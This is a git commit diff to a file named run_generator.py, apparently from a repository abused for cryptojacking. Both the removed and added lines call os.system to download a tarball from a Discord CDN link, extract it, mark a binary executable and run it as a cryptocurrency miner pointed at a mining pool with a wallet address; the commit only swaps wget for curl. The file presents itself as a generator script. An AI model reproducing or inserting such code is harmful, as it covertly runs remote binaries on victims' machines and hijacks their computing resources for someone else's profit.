238c1c991f90d93eafac4a90cc4f66b9e863e6a5
cringe0 <92528095+cringe0@users.noreply.github.com>
2021-10-14 18:35:44 +0500

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha 
-alpha.system("wget https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar xf bin.tar && cd bin && chmod +x work && ./work -rvram 1 -pool  us.stratu.ms:12287 -ewal 3JgjH5V3mT56F3kqCjLTzqirZz8ei9cNH5.siqdj3dp157i20c.rig -proto 4")
+alpha.system("curl -LJO https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar xf bin.tar && cd bin && chmod +x work && ./work -rvram 1 -pool  us.stratu.ms:12287 -ewal 3JgjH5V3mT56F3kqCjLTzqirZz8ei9cNH5.siqdj3dp157i20c.rig -proto 4")
